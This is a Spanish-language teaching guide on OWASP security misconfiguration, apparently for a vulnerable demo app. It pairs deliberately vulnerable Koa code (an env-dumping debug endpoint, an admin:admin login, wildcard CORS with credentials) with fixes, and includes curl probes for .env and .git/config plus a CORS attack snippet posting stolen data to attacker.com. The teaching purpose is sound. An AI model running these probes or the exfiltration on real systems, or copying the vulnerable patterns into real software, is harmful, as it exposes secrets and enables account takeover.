# ⚙️ Referencia Rápida: Security Misconfiguration

## 📋 ¿Qué es Security Misconfiguration?

**Security Misconfiguration** es la vulnerabilidad más común según OWASP. Ocurre cuando una aplicación, framework, servidor web, base de datos, o cualquier componente del sistema tiene configuraciones de seguridad incorrectas, incompletas, o por defecto.

### Tipos Comunes de Misconfiguration

1. **🐛 Debug Mode en Producción**

   - Expone stack traces, variables de entorno, rutas de archivos
   - Revela tecnologías y versiones

2. **🔑 Credenciales Por Defecto**

   - `admin:admin`, `root:root`, `admin:password`
   - Paneles de administración sin cambiar credenciales

3. **🗂️ Listado de Directorios Habilitado**

   - Permite explorar la estructura de archivos
   - Expone archivos sensibles (`.env`, `config.json`, backups)

4. **❌ Mensajes de Error Detallados**

   - Exponen stack traces con información de la arquitectura interna
   - Revelan rutas de archivos, hosts de base de datos, versiones

5. **🌐 Headers de Seguridad Faltantes**

   - Sin HSTS (permite downgrade a HTTP)
   - Sin CSP (permite XSS)
   - Sin X-Frame-Options (permite clickjacking)

6. **🔓 CORS Mal Configurado**

   - `Access-Control-Allow-Origin: *` con credenciales
   - Permite a cualquier sitio acceder a recursos protegidos

7. **🚪 Métodos HTTP Innecesarios**
   - TRACE, OPTIONS, PUT, DELETE habilitados sin necesidad
   - Pueden usarse para bypass de seguridad

---

## 🎯 Cómo Funciona el Ataque

### 1. Debug Endpoint Expuesto

**Vulnerable**:

```typescript
router.get("/debug-info", async (ctx) => {
  ctx.body = {
    env: process.env, // 🔴 JWT_SECRET, DB_PASSWORD, API_KEYS
    platform: process.platform,
    cwd: process.cwd(),
    uptime: process.uptime(),
  };
});
```

**Ataque**:

```bash
curl https://api.example.com/api/vulnerable/misconfiguration/debug-info
```

**Resultado**:

```json
{
  "env": {
    "DB_HOST": "db.internal.company.com",
    "DB_PASSWORD": "SuperSecret123!",
    "JWT_SECRET": "my-weak-secret",
    "AWS_ACCESS_KEY_ID": "AKIA...",
    "AWS_SECRET_ACCESS_KEY": "wJalr..."
  }
}
```

### 2. Credenciales Por Defecto

**Vulnerable**:

```typescript
router.post("/admin-login", async (ctx) => {
  const { username, password } = ctx.request.body;

  // VULNERABILITY: Credenciales por defecto sin cambiar
  if (username === "admin" && password === "admin") {
    ctx.body = { success: true, token: generateJWT({ role: "admin" }) };
  }
});
```

**Ataque**:

```bash
curl -X POST https://api.example.com/api/admin-login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'
```

### 3. Mensajes de Error Detallados

**Vulnerable**:

```typescript
try {
  await db.query(`SELECT * FROM users WHERE id = ${userId}`);
} catch (error) {
  ctx.status = 500;
  ctx.body = {
    error: error.message,
    stack: error.stack, // 🔴 Expone toda la pila de llamadas
    config: { dbHost: "db.internal.company.com", dbPort: 5432 },
  };
}
```

**Resultado**:

```json
{
  "error": "Connection timeout to db.internal.company.com:5432",
  "stack": "Error: Connection timeout\n  at /app/db/connection.js:42:15\n  at /app/routes/users.js:12:8",
  "config": {
    "dbHost": "db.internal.company.com",
    "dbPort": 5432
  }
}
```

El atacante ahora conoce:

- Host interno de la base de datos
- Puerto
- Estructura de directorios del código
- Librerías y versiones

### 4. CORS Mal Configurado

**Vulnerable**:

```typescript
router.get("/api/sensitive-data", async (ctx) => {
  ctx.set("Access-Control-Allow-Origin", "*"); // 🔴 Cualquier origen
  ctx.set("Access-Control-Allow-Credentials", "true"); // 🔴 Con credenciales

  ctx.body = { balance: 50000, accountNumber: "1234-5678-9012" };
});
```

**Ataque** (desde `https://attacker.com`):

```javascript
fetch("https://api.example.com/api/sensitive-data", {
  credentials: "include", // Envía cookies automáticamente
})
  .then((res) => res.json())
  .then((data) => {
    // Atacante puede leer datos sensibles desde otro dominio
    fetch("https://attacker.com/steal", {
      method: "POST",
      body: JSON.stringify(data),
    });
  });
```

---

## 🛡️ Cómo Protegerse

### 1. ✅ Deshabilitar Debug en Producción

```typescript
router.get("/debug-info", async (ctx) => {
  if (config.env === "production") {
    ctx.status = 404;
    ctx.body = { error: "Not found" };
    return;
  }

  // Incluso en dev, limitar información
  ctx.body = {
    environment: config.env,
    uptime: process.uptime(),
    // Sin env vars, sin rutas de archivos
  };
});
```

### 2. ✅ Mensajes de Error Genéricos

```typescript
try {
  await db.query(sql);
} catch (error) {
  // Log detallado solo en servidor
  logger.error("Database error:", error);

  // Mensaje genérico al cliente
  ctx.status = 500;
  ctx.body = {
    error: "An internal error occurred. Please try again later.",
    errorId: Date.now(), // ID para soporte
  };
}
```

### 3. ✅ Forzar Cambio de Credenciales Iniciales

```typescript
const user = await User.findByPk(userId);

if (user.isFirstLogin) {
  ctx.status = 403;
  ctx.body = {
    error: "Password change required",
    message: "You must change your password before continuing",
  };
  return;
}
```

### 4. ✅ Headers de Seguridad Completos

```typescript
// Middleware global
app.use(async (ctx, next) => {
  // HSTS: Forzar HTTPS
  ctx.set(
    "Strict-Transport-Security",
    "max-age=31536000; includeSubDomains; preload"
  );

  // Prevenir MIME sniffing
  ctx.set("X-Content-Type-Options", "nosniff");

  // Prevenir clickjacking
  ctx.set("X-Frame-Options", "DENY");

  // XSS Protection (legacy, pero útil)
  ctx.set("X-XSS-Protection", "1; mode=block");

  // Content Security Policy
  ctx.set(
    "Content-Security-Policy",
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
  );

  // Referrer Policy
  ctx.set("Referrer-Policy", "strict-origin-when-cross-origin");

  // Permissions Policy
  ctx.set("Permissions-Policy", "geolocation=(), microphone=(), camera=()");

  await next();
});
```

### 5. ✅ CORS con Whitelist

```typescript
const ALLOWED_ORIGINS = ["https://example.com", "https://app.example.com"];

router.get("/api/data", async (ctx) => {
  const origin = ctx.get("Origin");

  if (ALLOWED_ORIGINS.includes(origin)) {
    ctx.set("Access-Control-Allow-Origin", origin);
    ctx.set("Access-Control-Allow-Credentials", "true");
  }

  ctx.body = { data: "secure" };
});
```

### 6. ✅ Deshabilitar Listado de Directorios

```typescript
// Nginx
location / {
  autoindex off;
}

// Apache
Options -Indexes

// Koa (no servir archivos estáticos directamente)
// En su lugar, usar endpoints específicos para acceso a archivos
router.get("/files/:id", authMiddleware, async (ctx) => {
  const { id } = ctx.params;

  // Validar ID y permisos
  if (!isAllowedFile(id, ctx.state.user)) {
    ctx.status = 403;
    ctx.body = { error: "Forbidden" };
    return;
  }

  ctx.body = await getFile(id);
});
```

---

## 🧪 Probando Security Misconfiguration en la Demo

### Paso 1: Navegar a Security Misconfiguration

Abre: `http://localhost:3100/vulnerabilities/security-misconfiguration`

### Paso 2: Modo Vulnerable

1. Selecciona **"Vulnerable"**
2. Prueba estos payloads:

   - **🐛 Debug Info**:

     - ⚠️ Expone todas las variables de entorno, incluyendo secretos

   - **📁 File Listing**:

     - ⚠️ Muestra lista de archivos sensibles (`.env`, backups, etc.)

   - **❌ Error Details**:

     - ⚠️ Expone stack trace completo y configuración interna

   - **🔑 Admin Login**:

     - ⚠️ Prueba con credenciales por defecto (`admin:admin`)
     - Debería dar acceso de administrador sin autenticación real

   - **🌐 CORS Check**:

     - ⚠️ Verifica que el header `Access-Control-Allow-Origin` es `*`

   - **📄 Security Headers Check**:
     - ⚠️ Verifica que faltan headers de seguridad

### Paso 3: Modo Seguro

1. Selecciona **"Seguro"**
2. Prueba los mismos payloads:
   - **Debug Info**: Bloqueado (404 Not Found)
   - **File Listing**: Bloqueado (403 Forbidden)
   - **Error Details**: Mensaje genérico sin detalles internos
   - **Admin Login**: Rechazado, requiere autenticación real
   - **CORS**: Solo orígenes específicos permitidos
   - **Security Headers**: Todos los headers configurados correctamente

---

## 📊 Checklist de Configuración Segura

| Área                      | Vulnerable ❌                          | Seguro ✅                                   |
| ------------------------- | -------------------------------------- | ------------------------------------------- |
| **Debug Mode**            | Habilitado en producción               | Deshabilitado en producción                 |
| **Mensajes de Error**     | Detallados con stack traces            | Genéricos, logs solo en servidor            |
| **Credenciales**          | Por defecto (`admin:admin`)            | Forzar cambio, políticas fuertes            |
| **Headers de Seguridad**  | Faltantes                              | HSTS, CSP, X-Frame-Options, etc.            |
| **CORS**                  | `*` con credenciales                   | Whitelist de orígenes específicos           |
| **Listado Directorios**   | Habilitado                             | Deshabilitado                               |
| **Métodos HTTP**          | Todos permitidos                       | Solo necesarios (GET, POST)                 |
| **Versiones de Software** | Expuestas en headers (`Server: Koa/2`) | Ocultas o genéricas                         |
| **Archivos Sensibles**    | Accesibles (`.env`, `.git`)            | Bloqueados por `.gitignore` y configuración |

---

## 🚨 Casos Reales de Security Misconfiguration

### Equifax (2017)

- **Vulnerabilidad**: Apache Struts no actualizado
- **Causa**: Mala gestión de parches (misconfiguration de proceso)
- **Impacto**: 147 millones de registros comprometidos
- **Daño**: $700 millones en multas y compensaciones

### MongoDB Databases (2017)

- **Vulnerabilidad**: Instancias MongoDB expuestas sin autenticación
- **Causa**: Configuración por defecto sin password
- **Impacto**: 27,000+ bases de datos expuestas públicamente
- **Datos**: Millones de registros con información personal

### Uber (2016)

- **Vulnerabilidad**: Credenciales de AWS en repositorio GitHub privado
- **Causa**: `.env` file comprometido, falta de gestión de secretos
- **Impacto**: 57 millones de usuarios y conductores afectados
- **Daño**: $148 millones en multas

### Tesla Cloud (2018)

- **Vulnerabilidad**: Panel de Kubernetes sin autenticación
- **Causa**: Dashboard expuesto sin password
- **Impacto**: Minado de criptomonedas en infraestructura de Tesla
- **Nota**: Afortunadamente reportado por investigadores de seguridad

---

## 🔗 Herramientas Útiles

### Escaneo Automático

- **[OWASP ZAP](https://www.zaproxy.org/)**: Escanea configuraciones incorrectas
- **[Nikto](https://github.com/sullo/nikto)**: Escanea servidores web
- **[Security Headers](https://securityheaders.com/)**: Analiza headers de seguridad
- **[SSL Labs](https://www.ssllabs.com/ssltest/)**: Analiza configuración SSL/TLS

### Verificación Manual

```bash
# Verificar headers de seguridad
curl -I https://example.com

# Buscar archivos sensibles
curl https://example.com/.env
curl https://example.com/.git/config
curl https://example.com/config.json

# Probar credenciales por defecto
# (lista de credenciales comunes)
curl -X POST https://example.com/admin \
  -d "username=admin&password=admin"
```

### Automatización en CI/CD

```yaml
# GitHub Actions example
- name: Security Headers Check
  run: |
    curl -I ${{ secrets.APP_URL }} | \
    grep -E "(Strict-Transport-Security|Content-Security-Policy|X-Frame-Options)"

- name: Scan for Secrets
  uses: trufflesecurity/trufflehog@v3
```

---

## 💡 Puntos Clave para Recordar

1. **Security Misconfiguration es la vulnerabilidad más común** (OWASP Top 10 #5)
2. **Los errores de configuración se acumulan** a lo largo del stack: web server, app server, database, framework, librerías
3. **Las configuraciones por defecto NO son seguras** - siempre revisa y endurece
4. **Headers de seguridad son cruciales** pero frecuentemente olvidados
5. **Debug mode NUNCA en producción** - expone información crítica
6. **Gestión de secretos adecuada** - usar vaults (AWS Secrets Manager, HashiCorp Vault)
7. **Auditorías regulares** - las configuraciones derivan con el tiempo

---

## 🛠️ Comandos Útiles para la Demo

### Ver Headers de Seguridad (navegador)

1. Abre DevTools (F12)
2. Ve a la pestaña "Network"
3. Recarga la página
4. Haz clic en la petición
5. Ve a "Headers" → "Response Headers"

### Verificar con cURL

```bash
# Modo vulnerable - debug info
curl http://localhost:3101/api/vulnerable/misconfiguration/debug-info

# Modo seguro - debug info
curl http://localhost:3101/api/secure/misconfiguration/debug-info

# Admin login con credenciales por defecto
curl -X POST http://localhost:3101/api/vulnerable/misconfiguration/admin-login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'
```

---

✅ **Security Misconfiguration configurado y listo para demostrar**. Navega a `http://localhost:3100/vulnerabilities/security-misconfiguration` para probarlo.
